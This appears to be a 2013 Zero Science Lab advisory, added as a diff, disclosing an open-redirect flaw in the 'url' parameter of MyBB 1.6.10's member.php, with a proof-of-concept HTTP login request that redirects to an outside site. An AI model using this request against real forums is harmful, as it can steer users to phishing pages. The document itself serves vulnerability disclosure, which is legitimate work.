@@ -1,0 +1,48 @@
+
+MyBB 1.6.10 'url' Parameter Arbitrary Site Redirection Vulnerability
+
+
+Vendor: MyBB Group
+Product web page: http://www.mybb.com
+Affected version: 1.6.10
+
+Summary: MyBB, also known as MyBBoard or MyBulletinBoard, is a powerful,
+efficient, and free forum package, developed using PHP and MySQL.
+
+Desc: Input passed via the 'url' parameter in 'member.php' script is not
+properly verified before being used to redirect users. This can be exploited
+to redirect a user to an arbitrary website e.g. when a user clicks a specially
+crafted link to the affected script hosted on a trusted domain.
+
+
+Tested on: Microsoft Windows 7 Ultimate SP1 (EN)
+           Apache 2.4.2 (Win32)
+           PHP 5.4.7
+           MySQL 5.5.25a
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2013-5152
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2013-5152.php
+
+
+02.08.2013
+
+---
+
+
+POST /mybb/member.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:22.0) Gecko/20100101 Firefox/22.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/mybb/index.php
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 133
+
+action=do_login&url=http://www.zeroscience.mk&quick_login=1&quick_username=admin&quick_password=admin&submit=Login&quick_remember=yes
